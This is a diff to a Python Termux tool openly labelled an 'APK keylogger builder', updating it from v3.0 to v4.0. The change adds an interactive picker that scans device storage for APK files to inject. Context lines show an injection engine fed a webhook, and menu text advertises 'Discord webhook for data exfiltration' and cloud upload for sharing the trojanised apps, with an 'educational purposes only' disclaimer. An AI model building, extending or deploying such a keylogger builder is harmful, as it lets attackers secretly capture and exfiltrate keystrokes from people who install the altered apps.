@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v3.0
-  Fixed: Path handling, auto-back issue fixed
+  TERMUX APK KEYLOGGER BUILDER v4.0
+  Interactive APK selection – no copy-paste needed!
   Developer: GT Security Team
 ============================================================
 """
@@ -15,6 +15,7 @@ import uuid
 import json
 import time
 import requests
+import glob
 from datetime import datetime
 
 # ---------------------------- COLORS ----------------------------
@@ -36,7 +37,7 @@ def print_c(msg, color=Colors.RESET):
 def check_dependencies():
     """Check if required tools are installed."""
     tools = {
-        'apktool': 'pkg install apktool -y OR manual install from GitHub',
+        'apktool': 'pkg install apktool -y OR manual install',
         'java': 'pkg install openjdk-17 -y OR openjdk-25',
         'zipalign': 'pkg install zipalign -y',
         'aapt': 'pkg install aapt -y OR pkg install android-tools -y'
@@ -191,6 +192,65 @@ def upload_to_cloud(filepath):
         pass
     return None
 
+# ---------------------------- INTERACTIVE APK SELECTOR ----------------------------
+def find_apk_files():
+    """Search for APK files in common directories."""
+    search_dirs = [
+        '/sdcard/Download',
+        '/sdcard/Downloads',
+        '/sdcard/',
+        '/storage/emulated/0/Download',
+        '/storage/emulated/0/',
+        '/data/app',  # system installed apps (may not be accessible)
+    ]
+    apk_files = []
+    for dir_path in search_dirs:
+        if os.path.exists(dir_path):
+            # use glob to find .apk files recursively (one level)
+            for ext in ['*.apk', '*.APK']:
+                pattern = os.path.join(dir_path, ext)
+                found = glob.glob(pattern)
+                apk_files.extend(found)
+            # also check subdirectories (two levels)
+            for sub in ['*/*.apk', '*/*.APK']:
+                pattern = os.path.join(dir_path, sub)
+                found = glob.glob(pattern)
+                apk_files.extend(found)
+    # remove duplicates
+    apk_files = list(set(apk_files))
+    return sorted(apk_files)
+
+def select_apk():
+    """Display APK list and let user choose by number."""
+    apk_files = find_apk_files()
+    if not apk_files:
+        print_c("\n[!] No APK files found in common directories.", Colors.RED)
+        print_c("   Please copy your APK to /sdcard/Download/ and try again.", Colors.YELLOW)
+        return None
+
+    print_c("\n📱 Found APK files:", Colors.BLUE)
+    for idx, path in enumerate(apk_files, 1):
+        # Show only filename for simplicity, but keep full path
+        size = os.path.getsize(path) / (1024 * 1024)
+        print_c(f"  [{idx}] {os.path.basename(path)} ({size:.1f} MB)", Colors.WHITE)
+
+    print_c("\n[0] Enter path manually", Colors.YELLOW)
+    choice = input("\n[?] Select APK by number (or 0 for manual): ").strip()
+
+    if choice == '0':
+        return input("📁 Enter full APK path: ").strip()
+    else:
+        try:
+            idx = int(choice) - 1
+            if 0 <= idx < len(apk_files):
+                return apk_files[idx]
+            else:
+                print_c("[!] Invalid number.", Colors.RED)
+                return None
+        except ValueError:
+            print_c("[!] Invalid input.", Colors.RED)
+            return None
+
 # ---------------------------- INJECTION ENGINE ----------------------------
 def inject_apk(input_apk, output_dir, webhook, features, interval):
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
@@ -270,9 +330,9 @@ def clear_screen():
 def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
-    ║   APK KEYLOGGER BUILDER v3.0             ║
-    ║   Local injection, cloud upload          ║
-    ║   Discord webhook data exfiltration      ║
+    ║   APK KEYLOGGER BUILDER v4.0             ║
+    ║   Interactive APK picker                 ║
+    ║   No copy-paste needed!                  ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
@@ -285,47 +345,15 @@ def main_menu():
     choice = input("\n[?] Choose option: ").strip()
     return choice
 
-def get_valid_apk_path():
-    """Get and validate APK path with proper handling."""
-    while True:
-        path = input("📁 Path to original APK: ").strip()
-        
-        # Remove quotes if present
-        path = path.strip('"').strip("'")
-        
-        # Expand ~ if present
-        if path.startswith('~'):
-            path = os.path.expanduser(path)
-        
-        # Check if file exists
-        if os.path.exists(path):
-            return path
-        
-        # If not exists, try with /sdcard prefix
-        if not path.startswith('/sdcard/') and not path.startswith('/storage/'):
-            alt_path = f"/sdcard/{path}"
-            if os.path.exists(alt_path):
-                print_c(f"[✓] Using path: {alt_path}", Colors.GREEN)
-                return alt_path
-        
-        print_c(f"[!] File not found: {path}", Colors.RED)
-        print_c("   Tip: Use /sdcard/Download/your_app.apk format", Colors.YELLOW)
-        print_c("   Or type 'ls /sdcard/Download/*.apk' to see available APKs", Colors.YELLOW)
-        
-        retry = input("\n[?] Try again? (y/n): ").lower()
-        if retry != 'y':
-            return None
-
 def inject_flow():
     clear_screen()
     show_banner()
     print_c("\n--- INJECT APK ---", Colors.BLUE)
-    print_c("📌 Tip: APK files are usually in /sdcard/Download/", Colors.YELLOW)
-    print_c("   Check with: ls -la /sdcard/Download/*.apk\n", Colors.YELLOW)
 
-    # APK path with proper validation
-    apk_path = get_valid_apk_path()
+    # APK selection
+    apk_path = select_apk()
     if not apk_path:
+        input("\n[Press Enter to go back]")
         return
 
     # Webhook
@@ -397,6 +425,7 @@ def about():
     print_c("  - Discord webhook for data exfiltration")
     print_c("  - Local processing – no server needed")
     print_c("  - Upload to cloud for easy sharing")
+    print_c("  - Interactive APK picker – no typing required!")
     print_c("\nDeveloper: GT Security Team")
     print_c("For educational purposes only.")
     input("\n[Press Enter to go back]")
